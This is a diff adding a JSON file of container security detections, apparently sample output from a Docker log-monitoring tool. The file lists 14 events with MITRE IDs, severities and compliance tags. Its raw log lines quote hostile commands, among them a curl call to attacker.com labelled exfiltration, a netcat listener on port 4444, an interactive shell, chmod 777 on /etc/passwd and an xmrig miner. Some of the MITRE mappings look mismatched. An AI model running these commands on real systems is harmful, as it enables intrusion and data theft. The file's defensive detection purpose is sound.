@@ -1,0 +1,306 @@
+{
+  "events": [
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470914",
+      "hostname": "server1",
+      "log_type": "docker_daemon",
+      "description": "Container Instability/Resource Issue",
+      "mitre": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "T1496"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "HIPAA",
+        "NIST"
+      ],
+      "raw_log": "[20/Feb/2026:10:28:00] OOM killed container database"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470903",
+      "hostname": "server1",
+      "log_type": "docker_daemon",
+      "description": "Docker Socket Access",
+      "mitre": [
+        {
+          "technique_id": "T1068",
+          "technique_name": "T1068"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "[20/Feb/2026:10:27:00] docker.sock access from container app-server"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470881",
+      "hostname": "server1",
+      "log_type": "docker_daemon",
+      "description": "Host Volume Mounted",
+      "mitre": [
+        {
+          "technique_id": "T1611",
+          "technique_name": "T1611"
+        }
+      ],
+      "severity": "high",
+      "compliance": [
+        "PCI_DSS",
+        "SOC2",
+        "NIST"
+      ],
+      "raw_log": "[20/Feb/2026:10:26:00] Volume mount detected: -v /host/data:/container/data"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470860",
+      "hostname": "server1",
+      "log_type": "docker_daemon",
+      "description": "Container Instability/Resource Issue",
+      "mitre": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "T1496"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "HIPAA",
+        "NIST"
+      ],
+      "raw_log": "[20/Feb/2026:10:25:00] Container web-app restarted unexpectedly (exit 137)"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470523",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "postgres",
+      "image_name": "postgres:14",
+      "description": "Sensitive File Access",
+      "mitre": [
+        {
+          "technique_id": "T1082",
+          "technique_name": "T1082"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "container=postgres image=postgres:14 [20/Feb/2026:10:24:00] /etc/shadow accessed"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470492",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "app-server",
+      "image_name": "ubuntu:20.04",
+      "description": "Container Privilege Escalation",
+      "mitre": [
+        {
+          "technique_id": "T1068",
+          "technique_name": "T1068"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "container=app-server image=ubuntu:20.04 [20/Feb/2026:10:23:00] privileged mode requested"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470477",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "jenkins",
+      "image_name": "jenkins/jenkins",
+      "description": "Sensitive File Access",
+      "mitre": [
+        {
+          "technique_id": "T1082",
+          "technique_name": "T1082"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "container=jenkins image=jenkins/jenkins [20/Feb/2026:10:22:00] /root/.ssh/authorized_keys modified"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470442",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "mongo",
+      "image_name": "mongo:5",
+      "description": "Data Exfiltration Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1041",
+          "technique_name": "T1041"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "container=mongo image=mongo:5 [20/Feb/2026:10:21:00] Data exfiltration attempt: curl http://attacker.com | base64"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470379",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "web-app",
+      "image_name": "nginx:latest",
+      "description": "Reverse Shell Detected",
+      "mitre": [
+        {
+          "technique_id": "T1059",
+          "technique_name": "T1059"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [],
+      "raw_log": "container=web-app image=nginx:latest [20/Feb/2026:10:20:00] Reverse shell detected: /bin/sh -i"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470352",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "redis",
+      "image_name": "redis:7",
+      "description": "Cryptocurrency Mining Detected",
+      "mitre": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "T1496"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "HIPAA",
+        "NIST"
+      ],
+      "raw_log": "container=redis image=redis:7 [20/Feb/2026:10:19:00] Crypto mining detected: xmrig process running"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470329",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "app-server",
+      "image_name": "ubuntu:20.04",
+      "description": "Sensitive File Access",
+      "mitre": [
+        {
+          "technique_id": "T1082",
+          "technique_name": "T1082"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "container=app-server image=ubuntu:20.04 [20/Feb/2026:10:18:00] chmod 777 /etc/passwd executed"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470293",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "database",
+      "image_name": "mysql:8.0",
+      "description": "Container Privilege Escalation",
+      "mitre": [
+        {
+          "technique_id": "T1068",
+          "technique_name": "T1068"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "container=database image=mysql:8.0 [20/Feb/2026:10:17:00] Root user accessed from unusual IP 192.168.1.100"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470272",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "web-app",
+      "image_name": "nginx:latest",
+      "description": "Suspicious Process in Container",
+      "mitre": [
+        {
+          "technique_id": "T1056",
+          "technique_name": "T1056"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "container=web-app image=nginx:latest [20/Feb/2026:10:16:00] suspicious process detected: nc -l -p 4444"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:52.470187",
+      "hostname": "server1",
+      "log_type": "docker_container",
+      "container_name": "web-app",
+      "image_name": "nginx:latest",
+      "description": "Untrusted Container Image",
+      "mitre": [
+        {
+          "technique_id": "T1106",
+          "technique_name": "T1106"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "container=web-app image=nginx:latest [20/Feb/2026:10:15:23] GET /admin 200"
+    }
+  ],
+  "statistics": {
+    "total_events": 14,
+    "by_type": {
+      "docker_daemon": 4,
+      "docker_container": 10
+    },
+    "by_severity": {
+      "medium": 2,
+      "critical": 6,
+      "high": 6
+    },
+    "by_compliance": {
+      "PCI_DSS": 8,
+      "HIPAA": 7,
+      "NIST": 8,
+      "GDPR": 4,
+      "SOC2": 4,
+      "ISO_27001": 4
+    },
+    "top_containers": {
+      "postgres": 1,
+      "app-server": 2,
+      "jenkins": 1,
+      "mongo": 1,
+      "web-app": 3,
+      "redis": 1,
+      "database": 1
+    }
+  }
+}
